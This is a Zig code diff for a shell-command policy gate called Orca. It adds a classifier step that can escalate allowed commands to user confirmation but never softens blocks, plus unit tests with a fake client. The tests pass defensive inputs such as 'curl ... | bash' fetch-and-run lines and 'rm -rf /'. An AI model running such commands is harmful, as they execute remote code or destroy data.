@@ -15,6 +15,7 @@ const daemon = @import("daemon.zig");
 const rust_visibility = @import("rust_visibility.zig");
 const feed_writer = @import("feed_writer.zig");
 const pack_config = @import("pack_config.zig");
+const fm_steward_client = @import("fm_steward_client.zig");
 const supervisor = core.supervisor;
 
 pub const ShellCommandEvent = struct {
@@ -358,7 +359,33 @@ pub const AfterHardFenceDecision = struct {
 pub const ShellWithPolicyDecision = struct {
     decision: PluginDecision,
     /// Static reason for fail-closed / hard-fence / sticky / strict refuse; null for plain matrix.
+    /// When `owned_reason` is set, prefer that (FM upgrade path).
     reason: ?[]const u8 = null,
+    /// Allocator-owned reason from FM steward (explain/why). Caller frees via `freeOwned`.
+    owned_reason: ?[]const u8 = null,
+    /// Allocator-owned FM sticky hints when present (free via `freeOwned`).
+    suggested_sticky_scope: ?[]const u8 = null,
+    suggested_effect_class: ?[]const u8 = null,
+    /// When true, sticky hint slices are owned (always true when set by applyFmSoftSeatbelt).
+    sticky_hints_owned: bool = false,
+
+    pub fn effectiveReason(self: ShellWithPolicyDecision) ?[]const u8 {
+        return self.owned_reason orelse self.reason;
+    }
+
+    pub fn freeOwned(self: *ShellWithPolicyDecision, allocator: std.mem.Allocator) void {
+        if (self.owned_reason) |r| {
+            allocator.free(r);
+            self.owned_reason = null;
+        }
+        if (self.sticky_hints_owned) {
+            if (self.suggested_sticky_scope) |s| allocator.free(s);
+            if (self.suggested_effect_class) |s| allocator.free(s);
+            self.suggested_sticky_scope = null;
+            self.suggested_effect_class = null;
+            self.sticky_hints_owned = false;
+        }
+    }
 };
 
 /// Synthetic or real engine outcome after `shell_engine.evaluateCommand` (or error).
@@ -589,14 +616,142 @@ pub fn resetSessionStickyStoreForTests() void {
     }
 }
 
-/// Optional policy context for daemon deny → product decision (WP4 wire).
+/// Optional policy context for daemon deny → product decision (WP4 + FM wire).
 pub const DaemonPolicyOpts = struct {
     command: []const u8 = "",
     permit: shell_engine.allowlist.Layered = .{},
     /// When null, sticky step is skipped (backward-compatible default).
     sticky: ?*policy.sticky.Store = null,
     effect_class: ?[]const u8 = null,
+    // ── FM soft seatbelt (Phase 4) ──────────────────────────────────────
+    /// Session id for risk-card-v1 (schema minLength 1). Default product id.
+    session_id: []const u8 = "orca-shell",
+    tool: []const u8 = "bash",
+    /// Product honesty: about-to-run is true. Only set false with host evidence.
+    executed: bool = true,
+    cwd: ?[]const u8 = null,
+    host: ?[]const u8 = null,
+    /// Injectable FM client for tests. Null → `fm_steward_client.defaultClient()`.
+    fm_client: ?fm_steward_client.Client = null,
+    /// Skip FM entirely (tests / host kill). Independent of `ORCA_FM_STEWARD=0`.
+    disable_fm: bool = false,
+    /// Wall budget for classify (default StewardSession 3000ms).
+    fm_timeout_ms: u32 = fm_steward_client.default_timeout_ms,
 };
+
+// ---------------------------------------------------------------------------
+// FM soft seatbelt choke point (Phase 4 WP3)
+// ---------------------------------------------------------------------------
+
+/// Context for building a shell risk card + classifying via the Mac steward.
+pub const FmShellContext = struct {
+    command: []const u8,
+    session_id: []const u8 = "orca-shell",
+    tool: []const u8 = "bash",
+    executed: bool = true,
+    cwd: ?[]const u8 = null,
+    host: ?[]const u8 = null,
+    /// Null → `defaultClient()` (macOS production / non-macOS continue stub).
+    client: ?fm_steward_client.Client = null,
+    /// When true, return `policy_out` without calling the client.
+    disable_fm: bool = false,
+    timeout_ms: u32 = fm_steward_client.default_timeout_ms,
+};
+
+fn fmContextFromOpts(opts: DaemonPolicyOpts) FmShellContext {
+    return .{
+        .command = opts.command,
+        .session_id = opts.session_id,
+        .tool = opts.tool,
+        .executed = opts.executed,
+        .cwd = opts.cwd,
+        .host = opts.host,
+        .client = opts.fm_client,
+        .disable_fm = opts.disable_fm,
+        .timeout_ms = opts.fm_timeout_ms,
+    };
+}
+
+/// After WP4 soft outcomes, optionally upgrade allow/warn → ask via Mac FM steward.
+///
+/// Hard rules:
+/// 1. `.block` → return as-is; **never** call the client
+/// 2. soft (allow|warn|ask) → risk-card-v1 → `Client.classify`
+/// 3. FM continue / timeout / fallback → keep `policy_out` (never invent ask)
+/// 4. FM ask | ask_sticky_candidate → force `.ask` with explain/why reason
+/// 5. May upgrade allow→ask only; never softens block/deny
+///
+/// Ownership: when upgrading to ask, `owned_reason` is allocator-owned (caller
+/// frees via `ShellWithPolicyDecision.freeOwned` or transfers into `OwnedRunDecision`).
+pub fn applyFmSoftSeatbelt(
+    allocator: std.mem.Allocator,
+    policy_out: ShellWithPolicyDecision,
+    ctx: FmShellContext,
+) !ShellWithPolicyDecision {
+    // 1. Hard outcomes never reach FM.
+    if (policy_out.decision == .block) return policy_out;
+    if (ctx.disable_fm) return policy_out;
+    // No command → cannot build a meaningful card; keep soft policy.
+    if (std.mem.trim(u8, ctx.command, " \t\r\n").len == 0) return policy_out;
+    if (ctx.session_id.len == 0 or ctx.tool.len == 0) return policy_out;
+
+    const card = policy.risk_card.forShellCommand(.{
+        .session_id = ctx.session_id,
+        .tool = ctx.tool,
+        .command = ctx.command,
+        .executed = ctx.executed,
+        .host = ctx.host,
+        .cwd = ctx.cwd,
+    }) catch return policy_out;
+
+    const card_json = policy.risk_card.encodeJson(allocator, card) catch return policy_out;
+    defer allocator.free(card_json);
+
+    const client = ctx.client orelse fm_steward_client.defaultClient();
+    const timeout = if (ctx.timeout_ms == 0) fm_steward_client.default_timeout_ms else ctx.timeout_ms;
+    var classify_result = client.classify(allocator, card_json, timeout);
+    defer classify_result.deinit(allocator);
+
+    // Timeout / fallback / continue → keep soft policy (no ask-spam).
+    if (classify_result.timed_out or classify_result.fallback) {
+        return policy_out;
+    }
+    switch (classify_result.verdict) {
+        .continue_ => return policy_out,
+        .ask, .ask_sticky_candidate => {
+            // Prefer steward explain, then why; fall back to a stable static string.
+            const reason_src: []const u8 = if (classify_result.explain) |e|
+                if (e.len > 0) e else classify_result.why
+            else
+                classify_result.why;
+            const owned = if (reason_src.len > 0)
+                try allocator.dupe(u8, reason_src)
+            else
+                try allocator.dupe(u8, "fm steward requested confirmation");
+            errdefer allocator.free(owned);
+
+            var sticky_scope: ?[]const u8 = null;
+            errdefer if (sticky_scope) |s| allocator.free(s);
+            var sticky_effect: ?[]const u8 = null;
+            errdefer if (sticky_effect) |s| allocator.free(s);
+            if (classify_result.suggested_sticky_scope) |s| {
+                if (s.len > 0) sticky_scope = try allocator.dupe(u8, s);
+            }
+            if (classify_result.suggested_effect_class) |s| {
+                if (s.len > 0) sticky_effect = try allocator.dupe(u8, s);
+            }
+
+            return .{
+                .decision = .ask,
+                .reason = policy_out.reason,
+                .owned_reason = owned,
+                .suggested_sticky_scope = sticky_scope,
+                .suggested_effect_class = sticky_effect,
+                .sticky_hints_owned = sticky_scope != null or sticky_effect != null,
+            };
+        },
+    }
+}
 
 const OwnedRunDecision = struct {
     decision: core.decision.Decision,
@@ -711,7 +866,8 @@ pub fn decisionFromDaemonResult(
 }
 
 /// Like `decisionFromDaemonResult`, but applies WP4 order when `opts` supplies
-/// command / sticky / permit (used by `evaluateCommand` product path).
+/// command / sticky / permit (used by `evaluateCommand` product path). Soft
+/// outcomes then pass through `applyFmSoftSeatbelt` (injectable via `opts.fm_client`).
 pub fn decisionFromDaemonResultWithPolicy(
     allocator: std.mem.Allocator,
     result: std.json.Value,
@@ -734,6 +890,7 @@ pub fn decisionFromDaemonResultWithPolicy(
                     opts.effect_class,
                 );
                 if (decided.decision == .block) {
+                    // Hard refuse — FM never runs.
                     const reason_src = decided.reason orelse "blocked by Orca policy";
                     const owned = try allocator.dupe(u8, reason_src);
                     errdefer allocator.free(owned);
@@ -750,17 +907,38 @@ pub fn decisionFromDaemonResultWithPolicy(
                 }
             }
             const plugin_decision = pluginDecisionFromDaemonAllow(result).applyCiMode(ci_mode);
-            const decision_result = decisionResultFromPluginDecision(plugin_decision);
-            // Align with hook.zig: daemon allow reasons may embed command fragments / secrets.
-            const reason = try core_api.redactAlloc(
+            // Soft seatbelt: may upgrade allow/warn → ask; never softens block.
+            var after_fm = try applyFmSoftSeatbelt(
                 allocator,
-                daemon.responseReason(result) orelse "command allowed by daemon evaluator",
+                .{ .decision = plugin_decision, .reason = null },
+                fmContextFromOpts(opts),
             );
+            // Transfer FM owned reason into OwnedRunDecision, or free sticky-only allocs.
+            defer {
+                // owned_reason transferred below when present; free leftover sticky hints.
+                after_fm.owned_reason = null;
+                after_fm.freeOwned(allocator);
+            }
+            const final_plugin = after_fm.decision;
+            const decision_result = decisionResultFromPluginDecision(final_plugin);
+            const reason: []const u8 = if (after_fm.owned_reason) |fm_reason|
+                fm_reason
+            else
+                try core_api.redactAlloc(
+                    allocator,
+                    daemon.responseReason(result) orelse "command allowed by daemon evaluator",
+                );
+            const risk_score: u8 = if (final_plugin == .ask)
+                RiskLevel.high.toRiskScore()
+            else if (final_plugin == .warn)
+                RiskLevel.medium.toRiskScore()
+            else
+                RiskLevel.low.toRiskScore();
             break :blk OwnedRunDecision{
                 .decision = .{
                     .result = decision_result,
                     .reason = reason,
-                    .risk_score = if (plugin_decision == .warn) RiskLevel.medium.toRiskScore() else RiskLevel.low.toRiskScore(),
+                    .risk_score = risk_score,
                     .requires_user = decision_result == .ask,
                     .ci_may_proceed = decision_result == .allow or decision_result == .observe,
                 },
@@ -792,11 +970,9 @@ pub fn decisionFromDaemonResultWithPolicy(
                 pluginDecisionForDaemonDeny(mode, risk);
 
             if (plugin_decision == .block) {
-                // Prefer any non-null WP4 reason (hard fence / strict refuse / fail-closed)
-                // over daemon echo. No hand-maintained allowlist — reasons are owned by
-                // decideShellWithPolicy and must surface as-is when present.
-                // Pack rule_id / remediation still attach when the daemon provided them
-                // (hard fence does not strip forensic metadata).
+                // Hard fence / strict refuse / fail-closed — FM never runs.
+                // Prefer any non-null WP4 reason over daemon echo.
+                // Pack rule_id / remediation still attach when the daemon provided them.
                 if (decided) |d| {
                     if (d.reason) |static_reason| {
                         const owned = try allocator.dupe(u8, static_reason);
@@ -841,15 +1017,31 @@ pub fn decisionFromDaemonResultWithPolicy(
             }
 
             // Mode softens a would-be deny (observe/ask/low-severity / sticky allow paths).
+            // Soft seatbelt may still upgrade allow/warn → ask.
+            const soft_reason: ?[]const u8 = if (decided) |d| d.reason else null;
+            var after_fm = try applyFmSoftSeatbelt(
+                allocator,
+                .{ .decision = plugin_decision, .reason = soft_reason },
+                fmContextFromOpts(opts),
+            );
+            defer {
+                after_fm.owned_reason = null;
+                after_fm.freeOwned(allocator);
+            }
+            const final_plugin = after_fm.decision;
+
             const rule = try rust_visibility.ruleIdFromDaemonResult(allocator, result);
             errdefer if (rule) |rule_name| allocator.free(rule_name);
-            const reason_src: []const u8 = if (decided) |d| blk2: {
-                if (d.reason) |r| break :blk2 r;
-                break :blk2 modeSoftenedReason(mode, risk, plugin_decision);
-            } else modeSoftenedReason(mode, risk, plugin_decision);
-            const reason = try allocator.dupe(u8, reason_src);
-            errdefer allocator.free(reason);
-            const decision_result = decisionResultFromPluginDecision(plugin_decision);
+            const reason: []const u8 = if (after_fm.owned_reason) |fm_reason|
+                fm_reason
+            else blk2: {
+                const reason_src: []const u8 = if (after_fm.effectiveReason()) |r|
+                    r
+                else
+                    modeSoftenedReason(mode, risk, final_plugin);
+                break :blk2 try allocator.dupe(u8, reason_src);
+            };
+            const decision_result = decisionResultFromPluginDecision(final_plugin);
             break :blk OwnedRunDecision{
                 .decision = .{
                     .result = decision_result,
@@ -2400,4 +2592,290 @@ test "zigEvaluator applies opt-in packs from cwd .orca.toml" {
         defer parsed.deinit();
         try std.testing.expectEqual(daemon.ResponseStatus.deny, daemon.responseStatus(parsed.value.result));
     }
+}
+
+// ---------------------------------------------------------------------------
+// FM soft seatbelt choke point (Phase 4 WP3) — fake-client unit table
+// ---------------------------------------------------------------------------
+
+const FmFakeState = struct {
+    call_count: u32 = 0,
+    /// Snapshot of last card JSON (copied; survives after classify returns).
+    last_card_buf: [2048]u8 = undefined,
+    last_card_len: usize = 0,
+    verdict: fm_steward_client.ClassifyVerdict = .continue_,
+    why: []const u8 = "fake continue",
+    explain: ?[]const u8 = null,
+    timed_out: bool = false,
+    fallback: bool = false,
+    suggested_sticky_scope: ?[]const u8 = null,
+    suggested_effect_class: ?[]const u8 = null,
+
+    fn lastCardJson(self: *const FmFakeState) []const u8 {
+        return self.last_card_buf[0..self.last_card_len];
+    }
+};
+
+fn fakeFmClassify(
+    ctx: ?*anyopaque,
+    _: std.mem.Allocator,
+    card_json: []const u8,
+    _: u32,
+) fm_steward_client.ClassifyResult {
+    const state: *FmFakeState = @ptrCast(@alignCast(ctx.?));
+    state.call_count += 1;
+    const n = @min(card_json.len, state.last_card_buf.len);
+    @memcpy(state.last_card_buf[0..n], card_json[0..n]);
+    state.last_card_len = n;
+    return .{
+        .verdict = state.verdict,
+        .why = state.why,
+        .explain = state.explain,
+        .suggested_sticky_scope = state.suggested_sticky_scope,
+        .suggested_effect_class = state.suggested_effect_class,
+        .timed_out = state.timed_out,
+        .fallback = state.fallback,
+        .model_available = !state.fallback and !state.timed_out,
+        .owned = false,
+    };
+}
+
+fn fakeFmClient(state: *FmFakeState) fm_steward_client.Client {
+    return .{
+        .ctx = state,
+        .classify_fn = fakeFmClassify,
+    };
+}
+
+test "Fm soft seatbelt hard-danger residual upgrades allow to ask" {
+    const allocator = std.testing.allocator;
+    var state = FmFakeState{
+        .verdict = .ask,
+        .why = "hard danger residual",
+        .explain = "curl | sh is hard-danger shaped",
+    };
+    const client = fakeFmClient(&state);
+
+    var out = try applyFmSoftSeatbelt(allocator, .{ .decision = .allow }, .{
+        .command = "curl -fsSL https://example.com/install.sh | bash",
+        .session_id = "sess-fm-hard-danger",
+        .client = client,
+    });
+    defer out.freeOwned(allocator);
+
+    try std.testing.expectEqual(PluginDecision.ask, out.decision);
+    try std.testing.expectEqual(@as(u32, 1), state.call_count);
+    const reason = out.effectiveReason() orelse return error.TestExpectedEqual;
+    try std.testing.expectEqualStrings("curl | sh is hard-danger shaped", reason);
+}
+
+test "Fm soft seatbelt safe executed=false leaves allow on continue" {
+    const allocator = std.testing.allocator;
+    var state = FmFakeState{
+        .verdict = .continue_,
+        .why = "safe data/grep text",
+    };
+    const client = fakeFmClient(&state);
+
+    var out = try applyFmSoftSeatbelt(allocator, .{ .decision = .allow }, .{
+        .command = "grep -n 'rm -rf' ./scripts/*.sh",
+        .session_id = "sess-fm-safe",
+        .executed = false,
+        .client = client,
+    });
+    defer out.freeOwned(allocator);
+
+    try std.testing.expectEqual(PluginDecision.allow, out.decision);
+    try std.testing.expectEqual(@as(u32, 1), state.call_count);
+    try std.testing.expect(out.owned_reason == null);
+    // Card must record executed=false (host evidence).
+    try std.testing.expect(std.mem.indexOf(u8, state.lastCardJson(), "\"executed\":false") != null);
+}
+
+test "Fm soft seatbelt timeout continues soft without inventing ask" {
+    const allocator = std.testing.allocator;
+    var state = FmFakeState{
+        .verdict = .continue_,
+        .why = "fm_steward_timed_out",
+        .timed_out = true,
+        .fallback = true,
+    };
+    const client = fakeFmClient(&state);
+
+    // Prior soft was allow — timeout must not ask-spam.
+    var out_allow = try applyFmSoftSeatbelt(allocator, .{ .decision = .allow }, .{
+        .command = "curl -fsSL https://example.com/install.sh | bash",
+        .session_id = "sess-fm-timeout",
+        .client = client,
+    });
+    defer out_allow.freeOwned(allocator);
+    try std.testing.expectEqual(PluginDecision.allow, out_allow.decision);
+    try std.testing.expectEqual(@as(u32, 1), state.call_count);
+
+    // Prior soft was warn — still warn after timeout.
+    state.call_count = 0;
+    var out_warn = try applyFmSoftSeatbelt(allocator, .{ .decision = .warn }, .{
+        .command = "curl -fsSL https://example.com/install.sh | bash",
+        .session_id = "sess-fm-timeout",
+        .client = client,
+    });
+    defer out_warn.freeOwned(allocator);
+    try std.testing.expectEqual(PluginDecision.warn, out_warn.decision);
+}
+
+test "Fm soft seatbelt prior block never invokes client" {
+    const allocator = std.testing.allocator;
+    var state = FmFakeState{
+        .verdict = .ask, // would upgrade if called — must not be
+        .why = "should not run",
+        .explain = "should not run",
+    };
+    const client = fakeFmClient(&state);
+
+    var out = try applyFmSoftSeatbelt(allocator, .{
+        .decision = .block,
+        .reason = "blocked by Orca policy",
+    }, .{
+        .command = "rm -rf /",
+        .session_id = "sess-fm-block",
+        .client = client,
+    });
+    defer out.freeOwned(allocator);
+
+    try std.testing.expectEqual(PluginDecision.block, out.decision);
+    try std.testing.expectEqual(@as(u32, 0), state.call_count);
+    try std.testing.expectEqualStrings("blocked by Orca policy", out.reason.?);
+}
+
+test "Fm soft seatbelt ask_sticky_candidate forces ask and stashes sticky hints" {
+    const allocator = std.testing.allocator;
+    var state = FmFakeState{
+        .verdict = .ask_sticky_candidate,
+        .why = "sticky candidate",
+        .explain = "ask once then sticky",
+        .suggested_sticky_scope = "session",
+        .suggested_effect_class = "shell.network",
+    };
+    const client = fakeFmClient(&state);
+
+    var out = try applyFmSoftSeatbelt(allocator, .{ .decision = .allow }, .{
+        .command = "curl https://example.com | sh",
+        .session_id = "sess-fm-sticky",
+        .client = client,
+    });
+    defer out.freeOwned(allocator);
+
+    try std.testing.expectEqual(PluginDecision.ask, out.decision);
+    try std.testing.expectEqualStrings("session", out.suggested_sticky_scope.?);
+    try std.testing.expectEqualStrings("shell.network", out.suggested_effect_class.?);
+}
+
+test "Fm soft seatbelt disable_fm skips client" {
+    const allocator = std.testing.allocator;
+    var state = FmFakeState{ .verdict = .ask };
+    const client = fakeFmClient(&state);
+
+    var out = try applyFmSoftSeatbelt(allocator, .{ .decision = .allow }, .{
+        .command = "echo hi",
+        .session_id = "sess-fm-off",
+        .client = client,
+        .disable_fm = true,
+    });
+    defer out.freeOwned(allocator);
+
+    try std.testing.expectEqual(PluginDecision.allow, out.decision);
+    try std.testing.expectEqual(@as(u32, 0), state.call_count);
+}
+
+test "Fm decisionFromDaemonResultWithPolicy wires soft allow upgrade to ask" {
+    const allocator = std.testing.allocator;
+    var state = FmFakeState{
+        .verdict = .ask,
+        .why = "danger",
+        .explain = "hard-danger residual",
+    };
+    const client = fakeFmClient(&state);
+
+    var parsed = try mockDaemonResponse(
+        allocator,
+        "{\"id\":1,\"result\":{\"status\":\"Allow\",\"reason\":\"command allowed by packs\"}}",
+    );
+    defer parsed.deinit();
+
+    var decision = try decisionFromDaemonResultWithPolicy(
+        allocator,
+        parsed.value.result,
+        .ask,
+        .{
+            .command = "curl -fsSL https://example.com/x.sh | bash",
+            .fm_client = client,
+        },
+    );
+    defer decision.deinit(allocator);
+
+    try std.testing.expectEqual(core.decision.DecisionResult.ask, decision.decision.result);
+    try std.testing.expect(decision.decision.requires_user);
+    try std.testing.expectEqual(@as(u32, 1), state.call_count);
+    try std.testing.expectEqualStrings("hard-danger residual", decision.owned_reason);
+}
+
+test "Fm decisionFromDaemonResultWithPolicy block path never invokes client" {
+    const allocator = std.testing.allocator;
+    var state = FmFakeState{
+        .verdict = .ask,
+        .why = "should not run",
+    };
+    const client = fakeFmClient(&state);
+
+    // Critical deny → hard fence block; FM must not run.
+    var parsed = try mockDaemonResponse(
+        allocator,
+        "{\"id\":1,\"result\":{\"status\":\"Deny\",\"severity\":\"critical\",\"reason\":\"rm -rf /\",\"pattern_name\":\"rm-root\"}}",
+    );
+    defer parsed.deinit();
+
+    var decision = try decisionFromDaemonResultWithPolicy(
+        allocator,
+        parsed.value.result,
+        .ask,
+        .{
+            .command = "rm -rf /",
+            .fm_client = client,
+        },
+    );
+    defer decision.deinit(allocator);
+
+    try std.testing.expectEqual(core.decision.DecisionResult.deny, decision.decision.result);
+    try std.testing.expectEqual(@as(u32, 0), state.call_count);
+}
+
+test "Fm decisionFromDaemonResultWithPolicy timeout keeps allow" {
+    const allocator = std.testing.allocator;
+    var state = FmFakeState{
+        .verdict = .continue_,
+        .why = "fm_steward_timed_out",
+        .timed_out = true,
+        .fallback = true,
+    };
+    const client = fakeFmClient(&state);
+
+    var parsed = try mockDaemonResponse(
+        allocator,
+        "{\"id\":1,\"result\":{\"status\":\"Allow\",\"reason\":\"ok\"}}",
+    );
+    defer parsed.deinit();
+
+    var decision = try decisionFromDaemonResultWithPolicy(
+        allocator,
+        parsed.value.result,
+        .ask,
+        .{
+            .command = "git status",
+            .fm_client = client,
+        },
+    );
+    defer decision.deinit(allocator);
+
+    try std.testing.expectEqual(core.decision.DecisionResult.allow, decision.decision.result);
+    try std.testing.expectEqual(@as(u32, 1), state.call_count);
 }
